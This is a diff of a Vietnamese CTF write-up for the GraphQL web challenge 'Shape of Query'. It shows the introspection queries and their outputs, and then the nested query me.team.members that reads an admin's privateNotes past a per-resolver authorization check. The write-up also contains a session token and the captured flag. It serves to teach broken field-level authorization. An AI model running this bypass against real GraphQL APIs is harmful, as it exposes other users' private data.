@@ -5,155 +5,366 @@ ctf: Pointer Overflow CTF 2026
 category: web
 difficulty: Silver 4
 tags:
-  - GraphQL
-  - Introspection
   - Broken Access Control
   - BFLA
+  - GraphQL
+  - Introspection
 ---
 
 ## Đề bài
-A collaborative research portal where every team keeps its own private notes. You are just an ordinary member — but the admin's notes are the ones worth reading.
+Progress relies on having the right infrastructure to foster collaboration. A frictionless system for the exchange of ideas, integrity-preserving measures, and plenty of backup. There are many platforms on the market for this. Well, I'm developing my own. It's not the best. It's not the fastest. It's not the most resilient. But it is the one that I own the IP rights for, so I'm pushing it hard. Since I have a bevy of CTF player's attention, seems like a good chance to score some free pen testing. Head over to my Collaborative Research Portal and poke around a little. I am most concerned about user security. Last thing we need is for researchers to start meddling with each others' stuff.
 
 https://shape-of-query.pointeroverflowctf.com/
-
-Flag Format: `POCTF{...}`
-
-> Flag của bài này gắn theo team/session: nó nhúng `cid`, `team_id` và `nonce` của token ta dùng. Token khác → flag khác. Flag dưới đây là kết quả thật lấy từ server với token `SHAPE1.454.81.JCLO26Y346U52HPX.1790837303.J6V5R3WPZTOJ5ZQ43Z6GBBXTQK`.
-
 ## Solution
-Truy cập vào lab, ta thấy một portal "Collaborative Research Portal" — một ô nhập *team session token* để đăng nhập, và lời nhắc *"After signing in, explore the GraphQL API at `/graphql`"*. Vậy đây là một bài GraphQL:
+Truy cập vào lab, ta thấy lời nhắc *"After signing in, explore the GraphQL API at `/graphql`"*. Vậy đây là một bài GraphQL:
 
 ![image](./web-landing.png)
 
-Ngay cái tên challenge — "Shape of Query" — đã là một gợi ý khá lộ liễu: *hình dạng của truy vấn quyết định dữ liệu mà ta chạm tới được*. Cứ ghi nhớ câu này, nó chính là chìa khoá.
+Sau khi login bằng token mà host cung cấp ta truy cập được vào bài.
 
-Trước khi nói chuyện với API, ta phải có phiên đăng nhập. Ta mint một session token ở trang chủ `pointeroverflowctf.com`, token trông như này:
-```
-SHAPE1 . 454 . 81 . JCLO26Y346U52HPX . 1790536083 . NONG6D72XUWHJOTVT5JKOI5GQR
- ver     team  cid    nonce              timestamp     MAC
-```
-Thử nhập token `1` để xem token được "mổ" ra sao thì thấy nó có 6 phần ngăn bằng dấu chấm, và phần cuối là một MAC (HMAC) ký toàn bộ các phần trước bằng secret của server. Nghĩa là ta không thể tự chế token cho `team`/`cid` khác, vì không có secret để ký lại.
+![image.png](./image.png)
 
-> Đây là tín hiệu sớm cần đọc được: lỗ hổng không nằm ở việc giả mạo token. Đập đầu vào MAC là ngõ cụt. Lỗ hổng (nếu có) sẽ nằm ở tầng ứng dụng, *sau khi* ta đã đăng nhập hợp lệ.
-
-Dán token vào ô và bấm Sign in. Phía sau, portal gọi `/session/exchange` để đổi token lấy một cookie `session` (Flask signed cookie), rồi đưa ta thẳng vào GraphiQL — một IDE GraphQL ngay trong trình duyệt để gõ và chạy query, không cần công cụ dòng lệnh nào cả.
-
-Tò mò thì mở DevTools → tab Application → Cookies soi cookie `session`, decode phần base64 ra thấy:
+Kiểm tra thử cookie trước thì thấy 1 đoạn giống Base64 encode nên thử decode thì thu được
 ```json!
 {"cid":81,"nonce":"JCLO26Y346U52HPX","team_id":454}
 ```
-Để ý: cookie không chứa `role`. Nghĩa là server phải tự tra role của ta từ DB dựa trên `cid`/`team_id`, và vì cookie đã được ký nên ta cũng không sửa được để tự phong mình làm admin. Đích ngắm vì thế chuyển hướng: thay vì *trở thành* admin, ta sẽ tìm cách đọc dữ liệu của admin mà không cần là admin — mẫu hình kinh điển của lỗi phân quyền theo object/field.
+![1793041276186-image.png](./1793041276186-image.png)
 
 ### Introspection — dựng lại tấm bản đồ
-Ở khung bên trái của GraphiQL ta gõ query, bấm nút ▶ (hoặc `Ctrl/Cmd + Enter`) để chạy, kết quả hiện ở khung bên phải. Với GraphQL, câu hỏi đầu tiên của ta luôn là: *schema trông như thế nào?* May mắn thay, server bật introspection.
-
-> `introspection` là cơ chế "tự khai báo" của GraphQL: ta gửi một query đặc biệt (`__schema`, `__type`) và server trả về toàn bộ danh sách type, field, argument. Với người phòng thủ nó tiện cho tài liệu; với ta nó là tấm bản đồ kho báu. Mà ở bài này lời giải nằm ở "đường đi" giữa các type, nên tấm bản đồ ấy là bắt buộc phải có.
-
+Comment của tác giả đã để lại gợi ý:
+`# Introspection is enabled — start by exploring the schema.`
+Với GraphQL, câu hỏi đầu tiên của ta luôn là: schema trông như thế nào? May mắn thay, server bật introspection.
+:::info
+`introspection` là cơ chế "tự khai báo" của GraphQL 
+Ta gửi một query đặc biệt (`__schema`, `__type`) và server trả về toàn bộ danh sách type, field, argument. 
+:::
 Hỏi danh sách type:
 ```graphql!
-{ __schema { types { name kind } } }
+{
+  __schema {
+    types {
+      name
+      kind
+    }
+  }
+}
 ```
-Bỏ qua các type built-in (`__*`, `String`, `Boolean`...), còn lại đáng chú ý: `Query`, `User`, `Team`, `UserRoleEnum`. Đào tiếp từng type bằng `__type(name:"...")` rồi ghép lại, ta được schema rút gọn:
+Output:
+```json
+{
+  "data": {
+    "__schema": {
+      "types": [
+        {
+          "kind": "OBJECT",
+          "name": "Query"
+        },
+        {
+          "kind": "OBJECT",
+          "name": "User"
+        },
+        {
+          "kind": "SCALAR",
+          "name": "ID"
+        },
+        {
+          "kind": "SCALAR",
+          "name": "String"
+        },
+        {
+          "kind": "ENUM",
+          "name": "UserRoleEnum"
+        },
+        {
+          "kind": "OBJECT",
+          "name": "Team"
+        },
+        {
+          "kind": "SCALAR",
+          "name": "Boolean"
+        },
+        {
+          "kind": "OBJECT",
+          "name": "__Schema"
+        },
+        {
+          "kind": "OBJECT",
+          "name": "__Type"
+        },
+        {
+          "kind": "ENUM",
+          "name": "__TypeKind"
+        },
+        {
+          "kind": "OBJECT",
+          "name": "__Field"
+        },
+        {
+          "kind": "OBJECT",
+          "name": "__InputValue"
+        },
+        {
+          "kind": "OBJECT",
+          "name": "__EnumValue"
+        },
+        {
+          "kind": "OBJECT",
+          "name": "__Directive"
+        },
+        {
+          "kind": "ENUM",
+          "name": "__DirectiveLocation"
+        }
+      ]
+    }
+  }
+}
+```
+Trong GraphQL, `built-in` type là những type được GraphQL định nghĩa sẵn:
+1. [Built-in scalar types](https://www.graphql-js.org/docs/basic-types/)
+![1793042629337-image.png](./1793042629337-image.png)
+2. [Built-in introspection types](https://graphql.org/learn/introspection/)
+Những type bắt đầu bằng `__` cũng được GraphQL định nghĩa sẵn để phục vụ introspection
+
+Bỏ qua các type built-in đó, còn lại `Query`, `User`, `Team`, `UserRoleEnum` là các custom/application-defined types 
+
+Đào tiếp từng type bằng payload sau:
+```graphql
+{
+  queryType: __type(name: "Query") {
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+
+  userType: __type(name: "User") {
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+
+  roleType: __type(name: "UserRoleEnum") {
+    enumValues {
+      name
+    }
+  }
+
+  teamType: __type(name: "Team") {
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+```
+Trả về output sau:
+```json
+{
+  "data": {
+    "queryType": {
+      "fields": [
+        {
+          "name": "me",
+          "type": {
+            "kind": "OBJECT",
+            "name": "User"
+          }
+        },
+        {
+          "name": "user",
+          "type": {
+            "kind": "OBJECT",
+            "name": "User"
+          }
+        }
+      ]
+    },
+    "roleType": {
+      "enumValues": [
+        {
+          "name": "ADMIN"
+        },
+        {
+          "name": "MEMBER"
+        }
+      ]
+    },
+    "teamType": {
+      "fields": [
+        {
+          "name": "id",
+          "type": {
+            "kind": "NON_NULL",
+            "name": null
+          }
+        },
+        {
+          "name": "name",
+          "type": {
+            "kind": "SCALAR",
+            "name": "String"
+          }
+        },
+        {
+          "name": "members",
+          "type": {
+            "kind": "LIST",
+            "name": null
+          }
+        }
+      ]
+    },
+    "userType": {
+      "fields": [
+        {
+          "name": "id",
+          "type": {
+            "kind": "NON_NULL",
+            "name": null
+          }
+        },
+        {
+          "name": "username",
+          "type": {
+            "kind": "NON_NULL",
+            "name": null
+          }
+        },
+        {
+          "name": "role",
+          "type": {
+            "kind": "ENUM",
+            "name": "UserRoleEnum"
+          }
+        },
+        {
+          "name": "team",
+          "type": {
+            "kind": "OBJECT",
+            "name": "Team"
+          }
+        },
+        {
+          "name": "privateNotes",
+          "type": {
+            "kind": "SCALAR",
+            "name": "String"
+          }
+        }
+      ]
+    }
+  }
+}
+```
+rồi ghép lại, ta được schema rút gọn như sau:
 ```graphql!
 type Query {
-  me: User                 # user hiện tại (suy ra từ cookie)
-  user(id: ID!): User      # tra user theo id
+  me: User
+  user: User
 }
 
 type User {
   id: ID!
   username: String!
-  role: UserRoleEnum       # ADMIN | MEMBER
-  team: Team               # user thuộc team nào
-  privateNotes: String     # <-- FIELD BÍ MẬT (chứa flag của admin)
+  role: UserRoleEnum
+  team: Team
+  privateNotes: String
 }
 
 type Team {
   id: ID!
   name: String
-  members: [User]          # <-- QUAN HỆ VÒNG: Team chứa lại [User]
+  members: [User]
+}
+
+enum UserRoleEnum {
+  ADMIN
+  MEMBER
 }
 ```
 Đoạn cần lưu ý nằm ở hai chỗ:
 ```
 User.privateNotes : String      <-- field mục tiêu, chỗ cất bí mật
-Team.members      : [User]      <-- vòng User → team → members → User
+User.team         : Team        <-- Từ User lấy Team qua `team`
+Team.members      : [User]      <-- Từ Team lấy User khác qua `members`
 ```
-Field `privateNotes` rõ ràng là nơi cất flag của admin. Còn `Team.members` trả về `[User]` — tức là từ một `User`, đi qua `team` rồi `members`, ta lại chạm về chính kiểu `User`. Một quan hệ tự tham chiếu vòng.
+Field `privateNotes` rõ ràng là nơi cất flag của admin. 
+Ta có `User.team.members: [User]` là một quan hệ tự tham chiếu vòng.
+-> Thử `nested authorization bypass`
 
-> Khi introspection cho thấy một object type tự tham chiếu vòng (`User.team.members: [User]`), đây là mẫu kinh điển để thử nested authorization bypass: nếu quyền chỉ được cài ở resolver "cửa chính", ta có thể vòng tới đúng object nhạy cảm bằng một con đường khác mà không ai canh.
-
-### Thăm dò biên giới phân quyền
+### Thử dùng `user(id)` để đọc thẳng `privateNotes` của admin
 Trước khi khai thác, phải biết chính xác cái gì bị chặn, cái gì không. Đọc chính mình qua `me`:
-```graphql!
-{ me { id username role privateNotes team { id name members { id username role } } } }
-```
-```json!
+![1793048676524-image.png](./1793048676524-image.png)
+1. Ta là `MEMBER` chứ không phải là `ADMIN` 
+2. `privateNotes` của bản thân đọc được bình thường
+→ resolver có trả field này, vấn đề là có thể đọc được của người khác không
+
+Vấn đề là chỉ có `me` và `user`, mà `me` chỉ tra `privateNotes` của bản thân nên giờ ta cần tìm cách tận dụng `user`. Để sử dụng được `user`, ta phải kiểm tra `user` trong `Query` nhận `argument` gì, hãy introspect `args` của field `user`:
+```graphql
 {
-  "me": {
-    "id": "user_454", "role": "MEMBER",
-    "privateNotes": "Grocery list, personal reminders. Nothing worth reading.",
-    "team": { "id": "team_454", "name": "Research Team 454",
-      "members": [
-        {"id":"user_454","username":"researcher_454","role":"MEMBER"},
-        {"id":"admin_454","username":"admin_454","role":"ADMIN"}
-      ]}
+  __type(name: "Query") {
+    fields {
+      name
+      args {
+        name
+        type {
+          name
+          kind
+        }
+      }
+    }
   }
 }
 ```
-
-Chạy ngay trên GraphiQL cho trực quan — ta là `researcher_454`, role `MEMBER`:
-
-![image](./web-graphiql-me.png)
-
-Ba điều rút ra:
-
-1. Ta là `MEMBER`, không phải admin → đừng mong đặc quyền.
-2. `privateNotes` của *chính ta* đọc được bình thường → resolver có trả field này, vấn đề chỉ là *cho ai đọc của ai*.
-3. Cùng team có `admin_454` role `ADMIN` → gần như chắc chắn flag nằm trong `admin_454.privateNotes`. Đây là mục tiêu cụ thể.
-
-Giờ thử đi cửa chính `user(id)` để đọc thẳng notes của admin:
-```graphql!
-{ user(id:"admin_454"){ id role privateNotes } }   # -> { "user": null }
-{ user(id:"user_454"){ id role privateNotes } }    # -> OK, đọc được (chính mình)
+![1793086342370-image.png](./1793086342370-image.png)
+Vậy `Query` có schema rút gọn thật sự như sau:
+```graphql
+type Query {
+  me: User
+  user(id: ID!): User    # Bắt buộc truyền tham số id 
+}
 ```
-Resolver `user(id)` có kiểm tra quyền: chỉ cho đọc chính mình, hỏi user khác thì trả `null`. Biên giới bảo vệ đến đây đã rõ:
-<center>
 
-`Query.user(id)` → [CÓ check quyền] → `User`&emsp;❌ chặn user khác
+Ta đã có `id` của `me`. Tìm cách sử dụng `user` của `Query` để truy cập vào `me` thử xem có đưa ra output giống khi truy cập trực tiếp bằng `me` không.
+Thử thay `me` = `user(id:"user_454")` cho ra kết quả tương tự nhau
+![1793048626791-image.png](./1793048626791-image.png)
 
-`Query.me` → [là chính mình] → `User (me)`&emsp;✅ nhưng chỉ ra được chính ta
-
-</center>
-
-Câu hỏi còn lại duy nhất: con đường vòng `me → team → members → User(admin)` thì có được check không?
-
+Vậy ta thử đi cửa chính `user(id)` để đọc thẳng `privateNotes` của admin. Trước hết phải đọc được id của admin đã.
+![1793086632399-image.png](./1793086632399-image.png)
+Ta thử đọc `user(id:"admin_454")` của admin
+![1793086848835-image.png](./1793086848835-image.png)
+Resolver `user(id)` có kiểm tra quyền: chỉ cho đọc chính mình, hỏi user khác thì trả `null`. 
 ### Lỗ hổng — Broken Field-Level Authorization
-Bản chất GraphQL: quyền đọc một field phụ thuộc vào ĐƯỜNG ĐI (path) tới field đó, chứ không phải bản thân field. Ở bài này, tác giả cài quyền ở resolver top-level (`me`, `user(id)`). Nhưng khi ta chạm tới cùng object `User` qua một resolver trung gian khác — `Team.members` — thì field `privateNotes` không tự kiểm tra lại quyền một lần nữa.
-<center>
-
-`Query.user(id)` → [có check] → `User.privateNotes`&emsp;❌ bị chặn
-
-`Query.me` → `Team.members` → [KHÔNG check] → `User.privateNotes`&emsp;✅ lọt
-
-</center>
-
-`me.team.members` trả về `[User]` gồm cả admin. Resolver `members` chỉ lo trả danh sách member, nó không gọi lại logic *"user này có được xem privateNotes của user kia không"*. Mà `privateNotes` thì được resolve mặc định (đọc thẳng từ object), nên chỉ cần yêu cầu field đó trong nhánh nested là server ngoan ngoãn trả về.
-
--> Payload: tận dụng đúng quan hệ vòng `Team.members` để men tới object admin. Gõ query này vào GraphiQL rồi bấm ▶:
+Bản chất GraphQL: quyền đọc một field phụ thuộc vào ĐƯỜNG ĐI (path) tới field đó, chứ không phải bản thân field. 
+Ở bài này, tác giả cài quyền ở resolver top-level (`me`, `user(id)`). Nhưng khi ta chạm tới cùng object `User` qua một resolver trung gian khác (`Team.members`) thì field `privateNotes` không tự kiểm tra lại quyền một lần nữa.
+-> Tận dụng đúng quan hệ vòng `Team.members` để chạm đến object admin, ta có Payload: 
 ```graphql!
-{ me { team { members { id username role privateNotes } } } }
+{
+  me{ 
+    team {
+      members {
+        id
+        username
+        role
+        privateNotes
+      }
+    }
+  }
+}
 ```
 Khung response bên phải hiện luôn flag ở `privateNotes` của phần tử role `ADMIN`:
-
-![image](./web-graphiql-flag.png)
-
-Lần này lớp phân quyền không tồn tại trên con đường vòng. Danh sách `members` hiện ra đầy đủ, và `privateNotes` của phần tử có role `ADMIN` (`admin_454`) chính là flag — đúng field mà cửa chính `user(id:"admin_454")` vừa phũ phàng trả về `null`, nay ta đọc được chỉ bằng cách đi qua `team { members }`.
+![1793085650404-image.png](./1793085650404-image.png)
 
 Đây chính là phiên bản GraphQL của [Broken Object/Field Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/) (BOLA/BFLA, thuộc OWASP API Security Top 10): cùng một field `privateNotes`, nhưng có hai con đường tới nó (`Query.user` và `Team.members`), tác giả chỉ vá đúng một cửa.
-
-:::warning
-Phân quyền trong GraphQL không nên đặt rải rác ở từng resolver "cửa chính". Vì mọi type đều có thể tới được qua nhiều đường quan hệ (`nested field`), lớp kiểm tra quyền phải tự gắn vào chính field/object nhạy cảm (ví dụ ngay trong resolver của `privateNotes`), chứ không phải chỉ ở `Query.user`/`Query.me`. Ngoài ra nên tắt introspection trên production và giới hạn độ sâu truy vấn (query depth limiting).
-:::
-
 -> Flag: `POCTF{81.454.JCLO26Y346U52HPX.Q3DYMABQPEVVLI5ZZN2WIVVAL4}`
